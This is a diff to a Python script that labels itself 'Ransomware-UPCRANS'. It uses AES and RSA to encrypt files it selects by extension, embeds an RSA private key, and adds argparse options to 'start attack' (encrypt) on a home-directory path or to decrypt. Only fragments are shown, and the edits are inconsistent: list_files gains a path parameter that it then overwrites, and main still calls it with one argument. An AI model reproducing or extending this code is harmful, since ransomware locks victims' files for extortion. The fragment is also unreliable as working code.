@@ -3,6 +3,7 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 import os, sys, struct
+import argparse
 
 if sys.version_info >= (3, 8, 0):
         import time
@@ -46,6 +47,19 @@ MQz5AoGBAK/R9Fx7UBmHcC+9ehBJ5aPzvU8DqiVYg2wAYGu/n81s30VdtTQwfSed
 +IbSWacaVjzrtfY/UcRkUrgQotk8a4kPZrijPogn060VnXPEeq3t
 -----END RSA PRIVATE KEY-----'''
 
+"""
+def parse_args():
+    parser = argparse.ArgumentParser(description='Ransomware-UPCRANS')
+    parser.add_argument('-p', '--path', help='Path to start attack. Default path = %%HOME%%/', action="store")
+
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('-e', '--encrypt', help='Start attack',
+                        action='store_true')
+    group.add_argument('-d', '--decrypt', help='Decrypt files',
+                        action='store_true')
+
+    return parser.parse_args()
+"""
 
 # Encrypt KEY (AES) with public key.
 def encrypt_key(AESkey, key):
@@ -64,7 +78,7 @@ def decrypt_key(AESkey, key):
 
 
 # List files of a system
-def list_files(option):
+def list_files(option, path):
     path = '.'
     if option == 1:
         extensions = ['txt']
@@ -168,7 +182,6 @@ def getKey(password):
 def main():   
     option = int(sys.argv[1])
     l_files = list_files(option)
-    l_files
 
     if option == 1:
         password = input("Enter the password >>> ")
@@ -185,7 +198,7 @@ def main():
 
     else:
         print("No option selected")   
-    
+   
 
 if __name__ == "__main__":
     main()
